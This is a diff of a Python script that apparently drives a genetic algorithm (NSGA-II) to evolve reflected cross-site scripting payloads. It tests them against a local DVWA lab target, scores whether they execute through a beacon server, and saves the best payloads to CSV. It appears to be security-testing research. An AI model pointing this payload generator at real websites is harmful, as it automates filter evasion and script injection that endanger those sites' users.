@@ -1,70 +1,119 @@
-# main_moga.py
-from src.send_request import login_dvwa
+# main.py
+import random, time, os, csv
+from deap import tools
+from src.beacon_server import start_beacon_server
 from src.ga_engine import setup_ga, component_render
 from src.fitness import evaluate
 from src.seed_loader import load_seed_pools
-import random
-from deap import tools
+from src.send_request import login_dvwa
 
-# ---------------------------
-# CONFIG
-# ---------------------------
-POP = 50
-GEN = 30
+# GA Configuration
+POP = 40
+GEN = 40
+CXPB = 0.6
+MUTPB = 0.45
+PATIENCE = 8
 
-if __name__ == "__main__":
-    login_dvwa(security_level="impossible")
-    print("[+] Logged in.")
+def run(target_url, param, seed_path="payload_base/xss_seed.txt", security_level=None):
+    # Start beacon server
+    start_beacon_server()
+    time.sleep(0.3)
 
-    url = "http://localhost/dvwa/vulnerabilities/xss_r/"
-    param = "name"
+    # Login ke DVWA (opsional)
+    try:
+        login_dvwa(security_level=security_level) if security_level else login_dvwa()
+    except:
+        print("[!] login_dvwa failed or not needed.")
 
-    pools = load_seed_pools("payload_base/xss_seed.txt")
+    # Load seeds
+    pools = load_seed_pools(seed_path)
     tag_pool, event_pool, js_pool = pools["tags"], pools["events"], pools["js"]
 
     toolbox = setup_ga(tag_pool, event_pool, js_pool)
 
-    # initial population
-    pop = toolbox.population(n=POP)
+    # Initial population
+    population = toolbox.population(n=POP)
 
-    # assign fitness
-    fitness = [evaluate(ind, url, param) for ind in pop]
-    for ind, fit in zip(pop, fitness):
-        ind.fitness.values = fit
+    for ind in population:
+        if tag_pool: ind[0] = random.choice(tag_pool)
+        if event_pool: ind[1] = random.choice(event_pool)
+        if js_pool: ind[2] = random.choice(js_pool)
+        if random.random() < 0.35 and js_pool:
+            ind[2] += random.choice(js_pool)
 
-    print("[+] Starting NSGA-II evolution...\n")
+    # Initial evaluation
+    for ind in population:
+        ind.fitness.values = evaluate(ind, target_url, param)
+
+    print("[+] Starting NSGA-II Evolution...\n")
+
+    history = []
+    best_exec_seen = 0
+    no_improve = 0
 
     for gen in range(GEN):
-        offspring = tools.selNSGA2(pop, len(pop))
+
+        # NSGA-II selection
+        offspring = tools.selNSGA2(population, len(population))
         offspring = list(map(toolbox.clone, offspring))
 
-        # crossover + mutation
+        # Variation
         for c1, c2 in zip(offspring[::2], offspring[1::2]):
-            toolbox.mate(c1, c2)
-            del c1.fitness.values
-            del c2.fitness.values
+            if random.random() < CXPB:
+                toolbox.mate(c1, c2)
+                del c1.fitness.values, c2.fitness.values
 
-        for mut in offspring:
-            toolbox.mutate(mut)
-            del mut.fitness.values
+        for mutant in offspring:
+            if random.random() < MUTPB:
+                toolbox.mutate(mutant)
+                del mutant.fitness.values
 
-        # evaluate invalid fitnesses
         invalid = [ind for ind in offspring if not ind.fitness.valid]
-        for ind, fit in zip(invalid, [evaluate(i, url, param) for i in invalid]):
-            ind.fitness.values = fit
+        for ind in invalid:
+            ind.fitness.values = evaluate(ind, target_url, param)
 
-        pop = offspring
+        population[:] = offspring
 
-        print(f"Gen {gen}:")
-        print("  top survivability:", max(ind.fitness.values[0] for ind in pop))
-        print("  top structure:", max(ind.fitness.values[1] for ind in pop))
+        # Logging
+        top_surv = max(ind.fitness.values[0] for ind in population)
+        top_struct = max(ind.fitness.values[1] for ind in population)
+        top_exec = max(ind.fitness.values[2] for ind in population)
 
-    # extract Pareto Front
-    pareto = tools.sortNondominated(pop, k=len(pop), first_front_only=True)[0]
+        print(f"Gen {gen}: survivability={top_surv}, structure={top_struct}, exec={top_exec}")
 
-    print("\n=== FINAL PARETO FRONT ===")
+        # Early stopping
+        if top_exec > best_exec_seen:
+            best_exec_seen = top_exec
+            no_improve = 0
+        else:
+            no_improve += 1
+
+        if no_improve >= PATIENCE and best_exec_seen > 0:
+            print("[!] Early stopping triggered.")
+            break
+
+    # Pareto front
+    pareto = tools.sortNondominated(population, len(population), first_front_only=True)[0]
+
+    # Save results
+    os.makedirs("results", exist_ok=True)
+    csv_path = os.path.join("results", f"moga_{int(time.time())}.csv")
+
+    with open(csv_path, "w", newline="", encoding="utf-8") as cf:
+        writer = csv.writer(cf)
+        writer.writerow(["payload", "survivability", "structure", "executed"])
+        for ind in pareto:
+            payload = component_render(ind)
+            writer.writerow([payload, *ind.fitness.values])
+
+    print("\n=== FINAL RESULTS ===")
     for ind in pareto:
         print("Payload:", component_render(ind))
-        print("Survivability:", ind.fitness.values[0])
-        print("Structure:", ind.fitness.values[1])
-        print()
+        print("Scores:", ind.fitness.values)
+        print("-" * 40)
+
+    print("Saved to:", csv_path)
+
+
+if __name__ == "__main__":
+    run("http://localhost/dvwa/vulnerabilities/xss_r/", "name", security_level="high")
